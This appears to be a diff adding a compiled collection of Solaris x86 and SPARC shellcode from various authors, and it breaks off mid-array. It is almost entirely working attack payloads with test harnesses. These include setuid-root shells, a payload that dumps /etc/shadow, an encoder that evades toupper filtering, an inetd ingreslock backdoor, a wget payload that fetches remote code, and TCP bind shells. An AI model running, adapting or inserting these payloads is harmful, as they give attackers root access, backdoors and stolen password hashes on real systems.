@@ -1,0 +1,1165 @@
+/*
+; sm4x 2008
+; /bin/cat /etc/shadow
+; 59 bytes
+; SunOS sol01 5.11 snv_86 i86pc i386 i86pc Solaris
+; (port to SunOS to pwn a b0x - thank god for that default __unix__ CRYPT_DEFAULT!!!!)
+; this is what happens when ur work takes away root pirv on a SunOS box :-/
+
+global _start
+_start:
+
+xor     eax, eax
+
+; --- setuid(0)
+push    eax
+push    eax
+mov     al, 0x17
+int     0x91
+
+; --- setup /etc/shadow
+jmp     short   load_file
+ok:
+pop     esi
+
+; setup /bin/cat
+push    eax
+push    0x7461632f
+push    0x6e69622f
+mov     ebx, esp
+
+; --- array setup
+push    eax     ; null
+push    esi     ; /etc/shadow
+push    ebx     ; /bin/cat
+mov     edx, esp
+
+; -- execve()
+push    eax     ; 0
+push    edx     ; array { "/bin/cat", "/etc/shadow", 0}
+push    ebx     ; /bin/cat
+mov     al, 0x3b
+push    eax
+int     0x91
+
+; --- exit
+inc	eax
+push    eax
+push    eax
+int     0x91
+
+load_file:
+call    ok
+db      '/etc/shadow'
+
+*/
+
+#include "stdio.h"
+
+char code[] =  "\x31\xc0\x50\x50\xb0\x17\xcd\x91\xeb\x20"
+		"\x5e\x50\x68\x2f\x63\x61\x74\x68\x2f\x62"
+		"\x69\x6e\x89\xe3\x50\x56\x53\x89\xe2\x50"
+		"\x52\x53\xb0\x3b\x50\xcd\x91\x40\x50\x50"
+		"\xcd\x91\xe8\xdb\xff\xff\xff\x2f\x65\x74"
+		"\x63\x2f\x73\x68\x61\x64\x6f\x77";
+
+int main(int argc, char **argv) {
+ int (*func)();
+ printf("Bytes: %d\n", sizeof(code));
+ func = (int (*)()) code;
+ (int)(*func)();
+}
+
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+; sm4x 2008
+; setuid(0), execve('/bin/sh', '/bin/sh', 0),
+; 39 bytes NizzULL free (you know...)
+; SunOS sol01 5.11 snv_86 i86pc i386 i86pc Solaris
+; quick port to drop root sh -  ;)  - SunOS is pwnij
+
+global _start
+_start:
+
+xor     eax, eax
+
+; --- setuid(0)
+push    eax
+push    eax
+mov     al, 0x17
+int     0x91
+
+; setup //bin/sh
+push    eax
+push    0x68732f6e
+push    0x69622f2f
+mov     ebx, esp
+
+; --- array setup
+push    eax     ; null
+push    ebx     ; //bin/sh
+mov     edx, esp
+
+; -- execve()
+push    eax     ; 0
+push    edx     ; array { "//bin/sh", 0}
+push    ebx     ; //bin/sh
+mov     al, 0x3b
+push    eax
+int     0x91
+
+; --- exit
+inc	eax
+push    eax
+push    eax
+int     0x91
+
+*/
+
+#include 
+
+char code[] =   "\x31\xc0\x50\x50\xb0\x17\xcd\x91\x50\x68"
+		"\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89"
+		"\xe3\x50\x53\x89\xe2\x50\x52\x53\xb0\x3b"
+		"\x50\xcd\x91\x40\x50\x50\xcd\x91";
+
+
+int main(int argc, char **argv) {
+ int (*func)();
+ printf("Bytes: %d\n", sizeof(code));
+ func = (int (*)()) code;
+ (int)(*func)();
+}
+
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+ * Solaris shellcode - execve /bin/sh
+ */
+
+#include 
+
+// http://www.shellcode.com.ar
+//
+// execve(//bin/sh)
+
+char shellcode[]=
+   "\xb8\xff\xf8\xff\x3c"       // mov    eax, 03cfff8ffh
+   "\xf7\xd0"                   // not    eax
+   "\x50"                       // push   eax
+   "\x31\xc0"                   // xor    eax, eax
+   "\xb0\x9a"                   // mov    al, 09ah
+   "\x50"                       // push   eax
+   "\x89\xe5"                   // mov    ebp, esp
+   "\x31\xc0"                   // xor    eax, eax
+   "\x50"                       // push   eax
+   "\x68\x2f\x2f\x73\x68"       // push   dword 68732f2fh
+   "\x68\x2f\x62\x69\x6e"       // push   dword 6e69622fh
+   "\x89\xe3"                   // mov    ebx, esp
+   "\x50"                       // push   eax
+   "\x53"                       // push   ebx
+   "\x89\xe2"                   // mov    edx, esp
+   "\x50"                       // push   eax
+   "\x52"                       // push   edx
+   "\x53"                       // push   ebx
+   "\xb0\x3b"                   // mov    al, 59
+   "\xff\xd5";                  // call   ebp
+
+//
+
+int
+main(void)
+{
+    void (*code)() = (void *)shellcode;
+    printf("Shellcode length: %d\n", strlen(shellcode));
+    code();
+    return(1);
+}
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/* 
+ *  Solaris/x86
+ *
+ *  Used for toupper() evasion (look to the linux version for an 
+ *  explanation and usage example). 
+ */
+ 
+char c0de[] = 
+/* main: */
+"\xeb\x33"                                /* jmp callz                */
+/* start: */
+"\x5e"                                    /* popl %esi                */
+"\x8d\x06"                                /* leal (%esi), %eax        */
+"\x29\xc9"                                /* subl %ecx, %ecx          */
+"\x89\xf3"                                /* movl %esi, %ebx          */
+"\x89\x5e\x08"                            /* movl %ebx, 0x08(%esi)    */
+"\xb1\x07"                                /* movb $0x07, %cl          */
+/* loopz: */
+"\x80\x03\x20"                            /* addb $0x20, (%ebx)       */
+"\x43"                                    /* incl %ebx                */
+"\xe0\xfa"                                /* loopne loopz             */
+"\x93"                                    /* xchgl %eax, %ebx         */
+"\x29\xc0"                                /* subl %eax, %eax          */
+"\x89\x5e\x0b"                            /* movl %ebx, 0x0b(%esi)    */
+"\x29\xd2"                                /* subl %edx, %edx          */
+"\x88\x56\x19"                            /* movb %dl, 0x19(%esi)     */
+"\x89\x56\x07"                            /* movl %edx, 0x07(%esi)    */
+"\x89\x56\x0f"                            /* movl %edx, 0x0f(%esi)    */
+"\x89\x56\x14"                            /* movl %edx, 0x14(%esi)    */
+"\xb0\x3b"                                /* movb $0x3b, %al          */
+"\x8d\x4e\x0b"                            /* leal 0x0b(%esi), %ecx    */
+"\x89\xca"                                /* movl %ecx, %edx          */
+"\x52"                                    /* pushl %edx               */
+"\x51"                                    /* pushl %ecx               */
+"\x53"                                    /* pushl %ebx               */
+"\x50"                                    /* pushl %eax               */
+"\xeb\x18"                                /* jmp lcall                */
+/* callz: */
+"\xe8\xc8\xff\xff\xff"                    /* call start               */
+
+"\x0f\x42\x49\x4e\x0f\x53\x48"            /* /bin/sh -= 0x20          */
+"\x01\x01\x01\x01\x02\x02\x02\x02\x03\x03\x03\x03"
+/* lcall: */
+"\x9a\x04\x04\x04\x04\x07\x04";
+
+
+
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+ *  Solaris/x86
+ *
+ *  Just execve()'s the following:
+ *   "echo \"ingreslock stream tcp nowait root /bin/sh sh -i\">/tmp/x;"
+ *   "/usr/sbin/inetd -s /tmp/x; /bin/rm -f /tmp/x";
+ *
+ *  for a trivial remote bd. Used in a few old Solaris/x86 remote exploits. 
+ */
+ 
+char c0de[] =
+"\xeb\x3d\x9a\x24\x24\x24\x24\x07\x24\xc3\x5e\x29\xc0\x89\x46\xbf\x88\x46\xc4"
+"\x89\x46\x0c\x88\x46\x17\x88\x46\x1a\x88\x46\x78\x29\xc0\x50\x56\x8d\x5e\x10"
+"\x89\x1e\x53\x8d\x5e\x18\x89\x5e\x04\x8d\x5e\x1b\x89\x5e\x08\xb0\x3b\xe8\xc6"
+"\xff\xff\xff\xff\xff\xff\xe8\xc6\xff\xff\xff\x01\x01\x01\x01\x02\x02\x02\x02"
+"\x03\x03\x03\x03\x04\x04\x04\x04"
+"\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x63\x20"
+"echo \"ingreslock stream tcp nowait root /bin/sh sh -i\">/tmp/x;"
+"/usr/sbin/inetd -s /tmp/x; /bin/rm -f /tmp/x";
+
+/* EOF */
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+Title: 	 Solaris/x86 - execve("/bin/sh","/bin/sh",NULL) - 27 bytes
+Author:  Jonathan Salwan <submit AT shell-storm.org>
+Web:	 http://www.shell-storm.org
+Twitter: http://twitter.com/jonathansalwan
+
+Date:	 2010-05-19
+Tested:  SunOS opensolaris 5.11 snv_111b i86pc i386 i86pc Solaris
+
+section .text
+    0x8048074:              31 c0              xorl   %eax,%eax
+    0x8048076:              50                 pushl  %eax
+    0x8048077:              68 6e 2f 73 68     pushl  $0x68732f6e
+    0x804807c:              68 2f 2f 62 69     pushl  $0x69622f2f
+    0x8048081:              89 e3              movl   %esp,%ebx
+    0x8048083:              50                 pushl  %eax
+    0x8048084:              53                 pushl  %ebx
+    0x8048085:              89 e2              movl   %esp,%edx
+    0x8048087:              50                 pushl  %eax
+    0x8048088:              52                 pushl  %edx
+    0x8048089:              53                 pushl  %ebx
+    0x804808a:              b0 3b              movb   $0x3b,%al
+    0x804808c:              50                 pushl  %eax
+    0x804808d:              cd 91              int    $0x91
+
+*/
+
+
+#include <stdio.h>
+
+char sc[] = "\x31\xc0\x50\x68\x6e\x2f"
+	    "\x73\x68\x68\x2f\x2f\x62"
+	    "\x69\x89\xe3\x50\x53\x89"
+	    "\xe2\x50\x52\x53\xb0\x3b"
+	    "\x50\xcd\x91";
+
+int main(void)
+{
+       	fprintf(stdout,"Length: %d\n",strlen(sc));
+	(*(void(*)()) sc)();
+
+return 0;
+}
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+Title:   Solaris/x86 - Remote Download file - 79 bytes 
+Author:  Jonathan Salwan <submit [!] shell-storm.org>
+Web:     http://www.shell-storm.org
+Twitter: http://twitter.com/jonathansalwan
+
+!Database of Shellcodes http://www.shell-storm.org/shellcode/
+
+Date:	 2010-05-25
+Tested:  SunOS opensolaris 5.11 snv_111b i86pc i386 i86pc Solaris
+
+
+section .text
+    0x8048074:              31 d2              xorl   %edx,%edx
+    0x8048076:              52                 pushl  %edx
+    0x8048077:              6a 73              pushl  $0x73
+    0x8048079:              66 68 72 69        pushw  $0x6972
+    0x804807d:              68 73 6f 6c 61     pushl  $0x616c6f73
+    0x8048082:              68 70 6c 65 2d     pushl  $0x2d656c70
+    0x8048087:              68 65 78 65 6d     pushl  $0x6d657865
+    0x804808c:              68 6f 72 67 2f     pushl  $0x2f67726f
+    0x8048091:              68 6f 72 6d 2e     pushl  $0x2e6d726f
+    0x8048096:              68 6c 2d 73 74     pushl  $0x74732d6c
+    0x804809b:              68 73 68 65 6c     pushl  $0x6c656873
+    0x80480a0:              89 e1              movl   %esp,%ecx
+    0x80480a2:              52                 pushl  %edx
+    0x80480a3:              6a 74              pushl  $0x74
+    0x80480a5:              68 2f 77 67 65     pushl  $0x6567772f
+    0x80480aa:              68 2f 62 69 6e     pushl  $0x6e69622f
+    0x80480af:              68 2f 75 73 72     pushl  $0x7273752f
+    0x80480b4:              89 e3              movl   %esp,%ebx
+    0x80480b6:              52                 pushl  %edx
+    0x80480b7:              51                 pushl  %ecx
+    0x80480b8:              53                 pushl  %ebx
+    0x80480b9:              89 e1              movl   %esp,%ecx
+    0x80480bb:              52                 pushl  %edx
+    0x80480bc:              51                 pushl  %ecx
+    0x80480bd:              53                 pushl  %ebx
+    0x80480be:              b0 3b              movb   $0x3b,%al
+    0x80480c0:              52                 pushl  %edx
+    0x80480c1:              cd 91              int    $0x91
+
+
+Exemple:
+--------
+ 
+ jonathan@opensolaris:~/shellcode/wget/C$ ls -l
+ total 11
+ -rwxr-xr-x 1 jonathan staff 8516 2010-05-25 13:33 remotedl-solaris
+ -rw-r--r-- 1 jonathan staff  565 2010-05-25 13:33 remotedl-solaris.c
+ jonathan@opensolaris:~/shellcode/wget/C$ ./remotedl-solaris 
+ Length: 79
+ --13:37:01--  http://shell-storm.org/exemple-solaris
+            => `exemple-solaris'
+ Resolving shell-storm.org... 82.243.29.135
+ Connecting to shell-storm.org|82.243.29.135|:80... connected.
+ HTTP request sent, awaiting response... 200 OK
+ Length: 15 [text/plain]
+
+ 100%[=============================================>] 15            --.--K/s             
+
+ 13:37:01 (468.93 KB/s) - `exemple-solaris' saved [15/15]
+
+ jonathan@opensolaris:~/shellcode/wget/C$ cat exemple-solaris 
+ Hello Solaris.
+ jonathan@opensolaris:~/shellcode/wget/C$
+
+*/
+
+#include <stdio.h>
+
+
+char sc[] = "\x31\xd2\x52\x6a\x73\x66\x68\x72\x69\x68\x73\x6f"
+            "\x6c\x61\x68\x70\x6c\x65\x2d\x68\x65\x78\x65\x6d"
+            "\x68\x6f\x72\x67\x2f\x68\x6f\x72\x6d\x2e\x68\x6c"
+            "\x2d\x73\x74\x68\x73\x68\x65\x6c\x89\xe1\x52\x6a"
+            "\x74\x68\x2f\x77\x67\x65\x68\x2f\x62\x69\x6e\x68"
+            "\x2f\x75\x73\x72\x89\xe3\x52\x51\x53\x89\xe1\x52"
+            "\x51\x53\xb0\x3b\x52\xcd\x91";
+
+
+int main(void)
+{
+        fprintf(stdout,"Length: %d\n",strlen(sc));
+        (*(void(*)()) sc)();
+
+return 0;
+}
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+Name = John Babio
+Twitter = 3vi1john
+
+SunOS opensolaris 10  5.11 i86pc i386 i86pc
+
+setuid(0)  /bin/cat //etc/shadow      
+
+char code[]=
+        "\x33\xc0\x50\x50\xb0\x17\xcd\x91\x33\xd2\x52\x68\x61\x64\x6f"
+        "\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\x8b\xcc\x52\x68"
+        "\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x8b\xdc\x52\x51\x53\x8b"
+        "\xcc\x52\x51\x53\xb0\x3b\x52\xcd\x91\x33\xc0\x50\xb0\x01\xcd\x91";
+
+int main(int argc, char **argv)
+{
+  int (*func)();
+  func = (int (*)()) code;
+  (int)(*func)();
+}
+
+8050410 <_start>:
+ 8050410:    33 c0                    xor    %eax,%eax
+ 8050412:    50                       push   %eax
+ 8050413:    50                       push   %eax
+ 8050414:    b0 17                    mov    $0x17,%al
+ 8050416:    cd 91                    int    $0x91
+ 8050418:    33 d2                    xor    %edx,%edx
+ 805041a:    52                       push   %edx
+ 805041b:    68 61 64 6f 77           push   $0x776f6461
+ 8050420:    68 63 2f 73 68           push   $0x68732f63
+ 8050425:    68 2f 2f 65 74           push   $0x74652f2f
+ 805042a:    8b cc                    mov    %esp,%ecx
+ 805042c:    52                       push   %edx
+ 805042d:    68 2f 63 61 74           push   $0x7461632f
+ 8050432:    68 2f 62 69 6e           push   $0x6e69622f
+ 8050437:    8b dc                    mov    %esp,%ebx
+ 8050439:    52                       push   %edx
+ 805043a:    51                       push   %ecx
+ 805043b:    53                       push   %ebx
+ 805043c:    8b cc                    mov    %esp,%ecx
+ 805043e:    52                       push   %edx
+ 805043f:    51                       push   %ecx
+ 8050440:    53                       push   %ebx
+ 8050441:    b0 3b                    mov    $0x3b,%al
+ 8050443:    52                       push   %edx
+ 8050444:    cd 91                    int    $0x91
+ 8050446:    33 c0                    xor    %eax,%eax
+ 8050448:    50                       push   %eax
+ 8050449:    b0 01                    mov    $0x1,%al
+ 805044b:    cd 91                    int    $0x91
+
+
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+##
+#
+#        Name: single_bind_tcp
+#   Platforms: Solaris
+#     Authors: vlad902 <vlad902 [at] gmail.com>
+#     Version: $Revision: 1.2 $
+#     License:
+#
+#        This file is part of the Metasploit Exploit Framework
+#        and is subject to the same licenses and copyrights as
+#        the rest of this package.
+#
+# Description:
+#
+#        Single bind TCP shell.
+#
+##
+
+.globl main
+
+main:
+	andn	%sp, 7, %sp
+
+	mov	1, %o4
+	xor	%o3, %o3, %o3
+	xor	%o3, %o3, %o2
+	mov	0x02, %o1
+	mov	0x02, %o0
+	mov	0xe6, %g1
+	ta	0x08
+
+	st	%o0, [ %sp - 0x08 ]
+
+#ifndef NO_NULLS
+	set	0x00027a68, %l0
+#else
+	set	0x27a68fff, %l0
+	srl	%l0, 12, %l0
+#endif
+	st	%l0, [ %sp - 0x10 ]
+	st	%g0, [ %sp - 0x0c ]
+	sub	%sp, 16, %o1
+	mov	0x10, %o2
+	mov	0xe8, %g1
+	ta	0x08
+
+	ld	[ %sp - 0x08 ], %o0
+	mov	0x01, %o1
+	mov	0xe9, %g1
+	ta	0x08
+
+	ld	[ %sp - 0x08 ], %o0
+	xor	%o1, %o1, %o1
+	or	%o1, %o1, %o2
+	mov	0xea, %g1
+	ta	0x08
+
+	st	%o0, [ %sp - 0x08 ]
+	mov	3, %o2
+fcntl_loop:
+	mov	9, %o1
+	subcc	%o2, 1, %o2
+	mov	0x3e, %g1
+	ta	0x08
+
+	bnz	fcntl_loop
+	ld	[ %sp - 0x08 ], %o0
+
+	xor	%o3, %o3, %o2
+	set	0x2f62696e, %l0
+	set	0x2f736800, %l1
+	sub	%sp, 0x10, %o0
+	sub	%sp, 0x08, %o1
+	std	%l0, [ %sp - 0x10 ]	
+	st	%o0, [ %sp - 0x08 ]
+	st	%g0, [ %sp - 0x04 ]
+	mov	0x3b, %g1
+	ta	0x08
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+//Solaris/Sparc - LSD
+char shellcode[]=
+    "\x20\xbf\xff\xff"     /* bn,a    <_shellcode-4>        */
+    "\x20\xbf\xff\xff"     /* bn,a    <_shellcode>          */
+    "\x7f\xff\xff\xff"     /* call    <_shellcode+4>        */
+    "\x90\x03\xe0\x20"     /* add     %o7,32,%o0           */
+    "\x92\x02\x20\x10"     /* add     %o0,16,%o1           */
+    "\xc0\x22\x20\x08"     /* st      %g0,[%o0+8]          */
+    "\xd0\x22\x20\x10"     /* st      %o0,[%o0+16]         */
+    "\xc0\x22\x20\x14"     /* st      %g0,[%o0+20]         */
+    "\x82\x10\x20\x0b"     /* mov     0xb,%g1              */
+    "\x91\xd0\x20\x08"     /* ta      8                    */
+    "/bin/ksh"
+;
+
+char jump[]=
+    "\x81\xc3\xe0\x08"     /* jmp     %o7+8                */
+    "\x90\x10\x00\x0e"     /* mov     %sp,%o0              */
+;
+
+static char nop[]="\x80\x1c\x40\x11";
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+ * lhall@telegenetic.net
+ * setreuid shellcode
+ * full description of how it was done and defines at
+ * http://www.telegenetic.net/sparc-shellcode.htm
+ */
+
+char shellcode[] =
+"\x90\x1A\x40\x09"  /* xor %o1, %o1, %o0          */
+"\x92\x1A\x40\x09"  /* xor %o1, %o1, %o1          */
+"\x82\x10\x20\xCA"  /* mov SYS_SETREUID(202), %g1 */
+"\x91\xD0\x20\x08"  /* ta KERNEL(0x08)            */
+"\x21\x0B\xD8\x9A"  /* sethi %hi(0x2f626900), %l0 */
+"\xA0\x14\x21\x6E"  /* or %l0, %lo(0x16e), %l0    */
+"\x23\x0B\xDC\xDA"  /* sethi %hi(0x2f736800), %l1 */
+"\xE0\x3B\xBF\xF0"  /* std %l0, [%sp - 0x10]      */
+"\x90\x23\xA0\x10"  /* sub %sp, 0x10, %o0         */
+"\xD0\x23\xBF\xF8"  /* st  %o0, [%sp - 0x8]       */
+"\x92\x23\xA0\x08"  /* sub %sp, 0x8, %o1          */
+"\x94\x1A\x80\x0A"  /* xor %o2, %o2, %o2          */
+"\x82\x10\x20\x3B"  /* mov SYS_EXECVE(59), %g1    */
+"\x91\xD0\x20\x08"; /* ta KERNEL(0x08)            */
+
+int
+main (int argc, char **argv)
+{
+       int (*ret)();
+       ret = (int(*)())shellcode;
+       (int)(*ret)();
+       exit(0);
+}
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+ * lhall@telegenetic.net
+ * portbind shellcode
+ * full description of how it was done and defines at
+ * http://www.telegenetic.net/sparc-shellcode.htm
+ */
+
+
+char shellcode[]=
+"\x9A\x1A\x40\x09" /* xor %o1, %o1, %o5          */
+"\x90\x10\x20\x02" /* mov PF_INET, %o0           */
+"\x92\x10\x20\x02" /* mov SOCK_STREAM, %o1       */
+"\x94\x10\x20\x06" /* mov IPPROTO_TCP, %o2       */
+"\x96\x1A\x40\x09" /* xor %o1, %o1, %o3          */
+"\x98\x22\x20\x01" /* sub %o0, 1, %o4            */
+"\x82\x10\x20\xE6" /* mov SYS_SOCKET, %g1        */
+"\x91\xD0\x20\x08" /* ta KERNEL                  */
+"\xA0\x1B\x40\x08" /* xor %o5, %o0, %l0          */
+"\xC0\x23\xBF\xF4" /* st  %g0, [%sp - 0xc]       */
+"\xA2\x10\x2D\x05" /* mov 3333, %l1              */
+"\xE2\x33\xBF\xF2" /* sth %l1, [%sp - 0xe]       */
+"\xA2\x10\x20\x02" /* mov AF_INET, %l1           */
+"\xE2\x33\xBF\xF0" /* sth %l1, [%sp - 0x10]      */
+"\x92\x23\xA0\x10" /* sub %sp, 0x10, %o1         */
+"\x94\x10\x20\x10" /* mov SOCKADDR_IN_SIZE, %o2  */
+"\x82\x10\x20\xE8" /* mov SYS_BIND, %g1          */
+"\x91\xD0\x20\x08" /* ta KERNEL                  */
+"\x90\x1B\x40\x10" /* xor %o5, %l0, %o0          */
+"\x92\x1B\x40\x0C" /* xor %o5, %o4, %o1          */
+"\x94\x1B\x40\x0C" /* xor %o5, %o4, %o2          */
+"\x82\x10\x20\xE9" /* mov SYS_LISTEN, %g1        */
+"\x91\xD0\x20\x08" /* ta KERNEL                  */
+"\xA2\x10\x20\x10" /* mov SOCKADDR_IN_SIZE, %l1  */
+"\xE2\x23\xBF\xDC" /* st %l1, [%sp - 0x24]       */
+"\x90\x1B\x40\x10" /* xor %o5, %l0, %o0          */
+"\x92\x23\xA0\x20" /* sub %sp, 0x20, %o1         */
+"\x94\x23\xA0\x24" /* sub %sp, 0x24, %o2         */
+"\x96\x1B\x40\x0C" /* xor %o5, %o4, %o3          */
+"\x82\x10\x20\xEA" /* mov SYS_ACCEPT, %g1        */
+"\x91\xD0\x20\x08" /* ta KERNEL                  */
+"\xA4\x1B\x40\x08" /* xor %o5, %o0, %l2          */
+"\x90\x1B\x40\x0C" /* xor %o5, %o4, %o0          */
+"\x82\x10\x20\x06" /* mov SYS_CLOSE, %g1         */
+"\x91\xD0\x20\x08" /* ta KERNEL                  */
+"\x91\xD0\x20\x08" /* ta KERNEL                  */
+"\x94\x1B\x40\x0C" /* xor %o5, %o4, %o2          */
+"\x94\x02\x80\x0A" /* add %o2, %o2, %o2          */
+"\x90\x1B\x40\x0A" /* xor %o5, %o2, %o0          */
+"\x91\xD0\x20\x08" /* ta KERNEL                  */
+"\x92\x1A\x40\x09" /* xor %o1, %o1, %o1          */
+"\x90\x1B\x40\x12" /* xor %o5, %l2, %o0          */
+"\x82\x10\x20\x3E" /* mov SYS_FCNTL, %g1         */
+"\x91\xD0\x20\x08" /* ta KERNEL                  */
+"\x90\x1B\x40\x12" /* xor %o5, %l2, %o0          */
+"\x94\x1A\x40\x09" /* xor %o1, %o1, %o2          */
+"\x91\xD0\x20\x08" /* ta KERNEL                  */
+"\x94\x1B\x40\x0C" /* xor %o5, %o4, %o2          */
+"\x90\x1B\x40\x12" /* xor %o5, %l2, %o0          */
+"\x91\xD0\x20\x08" /* ta KERNEL                  */
+"\x21\x0B\xD8\x9A" /* sethi %hi(0x2f626900), %l0 */
+"\xA0\x14\x21\x6E" /* or %l0, %lo(0x16e), %l0    */
+"\x23\x0B\xDC\xDA" /* sethi %hi(0x2f736800), %l1 */
+"\xE0\x3B\xBF\xF0" /* std %l0, [%sp - 0x10]      */
+"\x90\x23\xA0\x10" /* sub %sp, 0x10, %o0         */
+"\xD0\x23\xBF\xF8" /* st  %o0, [%sp - 0x8]       */
+"\x92\x23\xA0\x08" /* sub %sp, 0x8, %o1          */
+"\x94\x1A\x80\x0A" /* xor %o2, %o2, %o2          */
+"\x82\x10\x20\x3B" /* mov SYS_EXECVE, %g1        */
+"\x91\xD0\x20\x08"; /* ta KERNEL                 */
+
+int
+main (int argc, char **argv)
+{
+       int (*ret)();
+       ret = (int(*)())shellcode;
+       (int)(*ret)();
+       exit(0);
+}
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+!!! $Id: sparc-bind.s,v 1.1 2003/03/01 01:10:51 ghandi Exp $
+!!! Bind /bin/sh to TCP port 2001.  Calls setuid(0) so /bin/sh won't
+!!! drop privileges.  After assembly, change the third byte in the
+!!! trap instructions to 0x38 to avoid having spaces in the input so that
+!!! it may be used in an HTTP GET request.  For Solaris/SPARC.
+!!! 
+!!! "I've come here to chew bubble-gum and kick ass...And I'm all out of
+!!! bubble gum."
+!!! -- Nada (Roddy Piper), "They Live"
+!!! 
+!!! -ghandi < ghandi@mindless.com >
+!!!
+
+.global	bindsh
+.type bindsh,#function
+
+bindsh:	sub	%sp, 16, %l0		! struct sockaddr sa;
+
+	sub	%sp, %l0, %l7;
+	st	%l7, [%sp - 20]		! int sa_len = 16;
+
+	sub	%l7, 14, %o0
+	sub	%l7, 14, %o1
+	xor	%l1, %l1, %o2
+	xor	%l1, %l1, %o3		! %o3 will be used as a %g0
+	sub	%l7, 15, %o4
+	add	%l7, (230 - 16), %g1
+	ta	8
+	xor	%o2, %o0, %l2		! s = socket(AF_INET, SOCK_STREAM, 0);
+
+	sth	%o1, [%sp - 16]		! sa.sin_family = AF_INET;
+	mov	2001, %l6
+	sth	%l6, [%sp - 14]		! sa.sin_port = 2001;
+	st	%g0, [%sp - 12]		! sa.sin_addr.s_addr = INADDR_ANY;
+
+	xor	%o3, %l2, %o0
+	xor	%o3, %l0, %o1
+	xor	%o3, %l7, %o2
+	add	%l7, (232 - 16), %g1
+	ta	8			! bind(s, &sa, sa_len);
+
+	xor	%o3, %l2, %o0
+	sub	%l7, (16 - 5), %o1
+	add	%l7, (233 - 16), %g1
+	ta	8			! listen(s, SOMAXCONN);
+	
+	xor	%o3, %l2, %o0
+	xor	%o3, %l0, %o1
+	sub	%sp, 20, %o2
+	add	%l7, (234 - 16), %g1
+	ta	8		
+	xor	%o3, %o0, %l3		! c = accept(s, &sa, &sa_len);
+
+	xor	%o3, %l3, %o0
+	sub	%l7, (16 - 9),  %o1
+	xor	%sp, %sp, %o2
+	add	%l7, (62 - 16), %g1
+	ta	8			! ioctl(c, I_DUP2FD, 0);
+
+	xor     %o3, %l3, %o0
+        sub     %l7, (16 - 9),  %o1
+	add	%o3, 1, %o2
+	add	%l7, (62 - 16), %g1
+	ta	8			! ioctl(c, I_DUP2FD, 1);
+
+	xor     %o3, %l3, %o0
+        sub     %l7, (16 - 9),  %o1
+	add	%o3, 2, %o2
+	add	%l7, (62 - 16), %g1
+	ta	8			! ioctl(c, I_DUP2FD, 2);
+	
+	xor	%sp, %sp, %o0		! %o0 = 0;
+	add	%o3, 23, %g1
+	ta	8			! setuid(0);
+	set	0x2f62696e, %l0		! (void*)sh = '/bin';
+	set	0x2f736800, %l1		! (void*)sh + 4 = '/sh0';
+	sub	%sp, 16, %o0		! %o0 = '/bin/sh';
+	sub	%sp, 8, %o1		! %o1 = {'/bin/sh', NULL};
+	xor	%sp, %sp, %o2		! %o2 = NULL;
+	std	%l0, [%sp - 16]
+	st	%o0, [%sp - 8]		! argv[0] = sh;
+	st	%g0, [%sp - 4]		! argv[1] = NULL;
+	add	%o3, 59, %g1
+	ta	8			! execve(sh, argv, NULL);
+	xor	%sp, %sp, %o0		! %o0 = 0;
+	add	%o3, 160, %g1		! %g1 = 160;
+	ta	8			! lwp_exit(0)
+
+
+
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+ * Solaris shellcode - setreuid(geteuid()), setregid(getegid()), execve /bin/sh
+ *
+ * Claes M. Nyberg 20020124
+ * ,  
+ */
+
+#include 
+
+static char solaris_code[] =
+            
+            /* geteuid() */
+    "\x82\x10\x20\x18"   /* mov     24, %g1              */
+    "\x91\xd0\x20\x08"   /* ta      0x8                  */
+    "\x90\x02\x60\x01"   /* add     %o1, 1, %o0          */
+
+            /* setreuid() */
+    "\x90\x22\x20\x01"   /* sub     %o0, 1, %o0          */
+    "\x92\x10\x3f\xff"   /* mov     -1, %o1              */
+    "\x82\x10\x20\xca"   /* mov     202, %g1             */
+    "\x91\xd0\x20\x08"   /* ta      0x8                  */
+
+            /* getegid() */
+    "\x82\x10\x20\x2f"   /* mov     47, %g1              */
+    "\x91\xd0\x20\x08"   /* ta      0x8                  */
+    "\x90\x02\x60\x01"   /* add     %o1, 1, %o0          */
+
+            /* setregid() */
+    "\x90\x22\x20\x01"   /* sub     %o0, 1, %o0          */
+    "\x92\x10\x3f\xff"   /* mov     -1, %o1              */
+    "\x82\x10\x20\xcb"   /* mov     203, %g1             */
+    "\x91\xd0\x20\x08"   /* ta      0x8                  */
+
+            /* execve(/bin/sh ..) */
+    "\x94\x1a\x80\x0a"   /* xor     %o2, %o2, %o2        */
+    "\x21\x0b\xd8\x9a"   /* sethi   %hi(0x2f626800), %l0 */
+    "\xa0\x14\x21\x6e"   /* or      %l0, 0x16e, %l0      */
+    "\x23\x0b\xcb\xdc"   /* sethi   %hi(0x2f2f7000), %l1 */
+    "\xa2\x14\x63\x68"   /* or      %l1, 0x368, %l1      */
+    "\xd4\x23\xbf\xfc"   /* st      %o2, [%sp - 4]       */
+    "\xe2\x23\xbf\xf8"   /* st      %l1, [%sp - 8]       */
